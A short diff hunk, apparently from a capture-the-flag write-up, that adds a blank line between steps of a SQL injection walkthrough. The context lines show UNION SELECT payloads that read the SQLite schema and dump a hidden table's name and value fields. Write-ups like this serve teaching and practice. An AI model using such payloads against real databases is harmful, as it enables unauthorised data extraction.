@@ -38,6 +38,7 @@ And we can get our response in the report generated.
 ' UNION SELECT sql,NULL,NULL FROM sqlite_master WHERE name = 'aDNyM19uMF9mMTRn' --
 ```
 we can get the name of the fields in this table, they are called `name` and `value`.
+
 6. We just need to make a query to show everything in `aDNyM19uMF9mMTRn` with this payload:
 ```
 ' UNION SELECT value,name,NULL FROM aDNyM19uMF9mMTRn; --
